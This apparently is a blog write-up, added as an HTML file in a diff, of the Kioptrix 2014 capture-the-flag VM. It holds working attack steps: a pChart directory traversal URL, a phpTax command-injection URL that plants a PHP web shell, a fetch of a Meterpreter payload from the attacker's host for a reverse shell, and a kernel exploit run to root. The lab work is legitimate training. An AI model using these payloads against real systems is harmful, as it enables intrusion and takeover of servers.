@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Kioptrix 2014 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-04-25">April 25, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/kioptrix">kioptrix</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Kioptrix 2014</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>After a 2 year (hiatus?) since the last Kioptrix VM challenge, loneferret has released Kioptrix 2014.  This is still an &lsquo;entry level&rsquo; challenge, though it does have some interesting spins typical of loneferret&rsquo;s style of VM challenges.  The goal of the challenge is to obtain the flag.</p>
+
+<h2 id="nmap:026e58d39a8939d7b2fc2f771f0be136">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.1.125
+
+22/tcp   closed ssh
+80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Site doesn't have a title (text/html).
+8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 403)
+|_http-title: 403 Forbidden
+Running: FreeBSD 9.X
+OS CPE: cpe:/o:freebsd:freebsd:9
+OS details: FreeBSD 9.0-RELEASE
+</code></pre>
+
+<h2 id="nikto-wfuzz:026e58d39a8939d7b2fc2f771f0be136">Nikto, Wfuzz</h2>
+
+<p>Since only web services are available, nikto and wfuzz seemed like a good place to start.</p>
+
+<pre><code class="language-text">root@kali:~# nikto -h 192.168.1.125 -Display 124; nikto -h 192.168.1.125:8080 -Display 124
+
+root@kali:~# wfuzz -c -zfile,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.125/FUZZ/
+</code></pre>
+
+<p>Nothing came back from these scans and I noticed in particular, the <code>wfuzz</code> scans were running very slowly.  I did some checking to make sure it wasn&rsquo;t my network playing up, and evenutually concluded that some sort of server-side filtering must be taking place.  Although I had some ideas about how this could be achieved, I didn&rsquo;t proceed with any assumptions, save one.  The only thing I knew is that directories and issues could exist, that neither <code>nikto</code> or <code>wfuzz</code> could report, so I couldn&rsquo;t trust them one bit.</p>
+
+<p>Visiting the page on 8080 in <code>Iceweasel</code> results in the same forbidden message reported by <code>nmap</code>.  Whereas the page on 80 appears to be the default apache index page.</p>
+
+<p>However, I had a look at the source code for this page, and there was an HTML comment present which is not normally there.</p>
+
+<p><code>META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;5;URL=pChart2.1.3/index.php&quot;</code></p>
+
+<p>This gives away the presence of another webapp.  Typing the address in manually takes you to <code>pChart 2.1.3</code>.</p>
+
+<h2 id="pchart:026e58d39a8939d7b2fc2f771f0be136">pChart</h2>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/kioptrix-2014/pchart.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>A bit of research into <code>pChart</code> showed that this version has a directory traversal vulnerability - providing the opportunity to check out the Apache config files.  One of loneferret&rsquo;s curve-balls regarding this VM is the use of FreeBSD, for which the default location of apache differs from other Linux distro&rsquo;s.</p>
+
+<p><code>http://192.168.1.125/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code></p>
+
+<p>Giving this file a good read reveals the method behind the web filtering - by useragent.</p>
+
+<pre><code class="language-text">SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
+VirtualHost *:8080
+    DocumentRoot /usr/local/www/apache22/data2
+Directory &quot;/usr/local/www/apache22/data2&quot;
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+/Directory
+</code></pre>
+
+<p>Out of interest, I went and checked the apache error log and saw the records of all my scanning attempts getting blocked.</p>
+
+<p><code>[error] [client 192.168.1.120] client denied by server configuration</code></p>
+
+<p>So Apache is checking for a particular useragent string, and rejects requests if it doesn&rsquo;t match this string.  I went back to run <code>nikto</code> again, with the additional option:</p>
+
+<p><code>-useragent Mozilla/4.0 Mozilla4_browser</code></p>
+
+<p>The results for 80 were the same as before, but the results for 8080 were vastly different.  I used a plugin for <code>Iceweasel</code> that allows you to define the useragent strings and visited the page in my browser.</p>
+
+<p>Instead of getting the forbidden message as before, I was given a directory listing which contained another webapp.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/kioptrix-2014/phptax.jpg"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="phptax:026e58d39a8939d7b2fc2f771f0be136">phpTax</h2>
+
+<p>More research told me that this application was vulnerable to RCE - at last something that would help me get a shell!</p>
+
+<p>It turns out the version of <code>netcat</code> built within FreeBSD does not support the <code>-e</code> option.  I tried playing with the backpipe method, but this didn&rsquo;t seem to work - the connection to my machine would instantly drop.</p>
+
+<p>I wanted to test if the <code>www</code> user could write into the current directory.</p>
+
+<pre><code class="language-text">192.168.1.125:8080/phptax/drawimage.php?pfilez=xxx;id&gt;test.txt;&amp;pdf=make
+http://192.168.1.125:8080/phptax/test.txt
+uid=80(www) gid=80(www) groups=80(www)
+</code></pre>
+
+<p>I wanted an easier way to execute my commands, so echo&rsquo;d some very simple php code into a file.</p>
+
+<pre><code class="language-text">192.168.1.125:8080/phptax/drawimage.php?pfilez=xxx;echo '&lt; ?php system($_GET[cmd]); ? &gt;'&gt;cmd.php;&amp;pdf=make
+</code></pre>
+
+<p>Next, I went ahead and generated a Meterpreter PHP payload, and placed it within <code>/var/www/</code> (and started the apache service).  It didn&rsquo;t appear as though the usual suspects (<code>wget</code> etc) were installed, but this being FreeBSD I went in search of other tools which may be present.  <code>Fetch</code> was one such tool and behaves just like <code>wget</code>.</p>
+
+<pre><code class="language-text">http://192.168.1.125:8080/phptax/cmd.php?cmd=fetch%20http://192.168.1.120/shell.txt
+http://192.168.1.125:8080/phptax/cmd.php?cmd=ls
+cmd.php data drawimage.php files icons.inc index.php maps pictures readme shell.txt ttf
+</code></pre>
+
+<p>Confirmed the file was there (I also cat&rsquo;d it).  Next, I renamed the file to give it a .php extension.</p>
+
+<p><code>http://192.168.1.125:8080/phptax/cmd.php?cmd=mv%20shell.txt%20shell.php</code></p>
+
+<p>Then executed it (not before setting up my listener in the Metasploit Framework).</p>
+
+<p><code>192.168.1.125:8080/phptax/shell.php</code></p>
+
+<h2 id="privilege-escalation:026e58d39a8939d7b2fc2f771f0be136">Privilege Escalation</h2>
+
+<p>It turned out that escalating myself to root was relatively simple.  I found a <a href="http://www.exploit-db.com/exploits/28718/">suitable kernel exploit</a> and transfered it across using <code>netcat</code>.  Compiled and ran:</p>
+
+<pre><code class="language-text">gcc x.c -o x
+
+./x
+[+] SYSRET FUCKUP!!
+[+] Start Engine...
+[+] Crotz...
+[+] Crotz...
+[+] Crotz...
+[+] Woohoo!!!
+
+id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+
+cat congrats.txt
+If you are reading this, it means you got root (or cheated).
+Congratulations either way...
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
